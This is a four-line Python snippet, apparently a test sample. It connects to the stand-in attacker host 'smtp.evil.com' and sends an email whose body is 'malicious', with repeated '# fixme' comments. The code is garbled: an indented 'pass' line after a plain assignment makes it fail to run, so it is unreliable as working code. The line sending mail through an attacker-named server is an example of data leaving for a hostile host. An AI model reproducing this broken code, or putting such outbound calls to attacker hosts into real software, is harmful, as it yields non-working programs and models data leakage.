import smtplib
smtp = smtplib.SMTP('smtp.evil.com')  # test  # fixme  # fixme
    pass  # no-op
smtp.sendmail('a@a.com', 'b@b.com', 'malicious')